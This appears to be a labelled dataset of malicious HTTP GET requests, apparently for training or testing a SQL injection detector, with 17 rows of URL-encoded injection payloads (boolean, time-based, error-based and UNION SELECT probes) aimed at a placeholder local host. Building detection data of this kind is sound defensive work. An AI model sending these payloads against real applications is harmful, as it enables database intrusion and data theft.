"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_000001","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%28convert%28int%2C%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%289339%3D9339%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%29","/","p=%28convert%28int%2C%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%289339%3D9339%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%28convert%28int%2C%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%289339%3D9339%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000002","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%28select+%28case+when+%281938%3D1938%29+then+dbms_pipe.receive_message%28chr%28118%29%7C%7Cchr%28118%29%7C%7Cchr%28112%29%7C%7Cchr%2876%29%2C5%29+else+1938+end%29+from+dual%29","/","p=%28select+%28case+when+%281938%3D1938%29+then+dbms_pipe.receive_message%28chr%28118%29%7C%7Cchr%28118%29%7C%7Cchr%28112%29%7C%7Cchr%2876%29%2C5%29+else+1938+end%29+from+dual%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%28select+%28case+when+%281938%3D1938%29+then+dbms_pipe.receive_message%28chr%28118%29%7C%7Cchr%28118%29%7C%7Cchr%28112%29%7C%7Cchr%2876%29%2C5%29+else+1938+end%29+from+dual%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000003","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%28select+%28case+when+%289263%3D9263%29+then+1+else+9263%2A%28select+9263+from+mysql.db%29+end%29%29","/","p=%28select+%28case+when+%289263%3D9263%29+then+1+else+9263%2A%28select+9263+from+mysql.db%29+end%29%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%28select+%28case+when+%289263%3D9263%29+then+1+else+9263%2A%28select+9263+from+mysql.db%29+end%29%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000004","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%281931%3D1931%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29","/","p=%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%281931%3D1931%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%28select+char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select+%28case+when+%281931%3D1931%29+then+char%2849%29+else+char%2848%29+end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000005","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29","/","p=%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%28select+count%28%2A%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3%29 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000006","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1036%27%29+or+6872%3D6872+and+%28%27wvbi%27%3D%27wvbi","/","p=-1036%27%29+or+6872%3D6872+and+%28%27wvbi%27%3D%27wvbi","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1036%27%29+or+6872%3D6872+and+%28%27wvbi%27%3D%27wvbi HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000007","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1083%25%22%29%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%28%22%25%22%3D%22","/","p=-1083%25%22%29%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%28%22%25%22%3D%22","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1083%25%22%29%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%28%22%25%22%3D%22 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000008","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1084+where+1181%3D1181+or+make_set%289354%3D9354%2C7185%29--","/","p=-1084+where+1181%3D1181+or+make_set%289354%3D9354%2C7185%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1084+where+1181%3D1181+or+make_set%289354%3D9354%2C7185%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000009","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1127+or+7391%3D4954","/","p=-1127+or+7391%3D4954","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1127+or+7391%3D4954 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000010","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1174%22+union+all+select+4303%2C4303%2C4303%2C4303%23","/","p=-1174%22+union+all+select+4303%2C4303%2C4303%2C4303%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1174%22+union+all+select+4303%2C4303%2C4303%2C4303%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000011","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1212%25%27%29+or+make_set%287588%3D2306%2C2306%29+and+%28%27%25%27%3D%27","/","p=-1212%25%27%29+or+make_set%287588%3D2306%2C2306%29+and+%28%27%25%27%3D%27","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1212%25%27%29+or+make_set%287588%3D2306%2C2306%29+and+%28%27%25%27%3D%27 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000012","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1432+order+by+1%23","/","p=-1432+order+by+1%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1432+order+by+1%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000013","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1470%27%29%29%29+or+9323%3D9323%23","/","p=-1470%27%29%29%29+or+9323%3D9323%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1470%27%29%29%29+or+9323%3D9323%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000014","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1510%22%29+as+rqrv+where+4507%3D4507+union+all+select+4507%2C4507%2C4507%2C4507%2C4507--","/","p=-1510%22%29+as+rqrv+where+4507%3D4507+union+all+select+4507%2C4507%2C4507%2C4507%2C4507--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1510%22%29+as+rqrv+where+4507%3D4507+union+all+select+4507%2C4507%2C4507%2C4507%2C4507-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000015","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1526%27%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%27xpob%27%3D%27xpob","/","p=-1526%27%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%27xpob%27%3D%27xpob","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1526%27%29%29+or+elt%281032%3D1032%2C3623%29+and+%28%28%27xpob%27%3D%27xpob HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000016","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1587%27%29+or+8339%3D5540","/","p=-1587%27%29+or+8339%3D5540","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1587%27%29+or+8339%3D5540 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
"pos_modsec_learn_sqli_000017","1","modsec_learn_sqli","malicious/httpparams/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=-1641%27%7C%7C%28select+%27jfnu%27+where+7682%3D7682+union+all+select+7682%2C7682%2C7682--","/","p=-1641%27%7C%7C%28select+%27jfnu%27+where+7682%3D7682+union+all+select+7682%2C7682%2C7682--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=-1641%27%7C%7C%28select+%27jfnu%27+where+7682%3D7682+union+all+select+7682%2C7682%2C7682-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:httpparams"
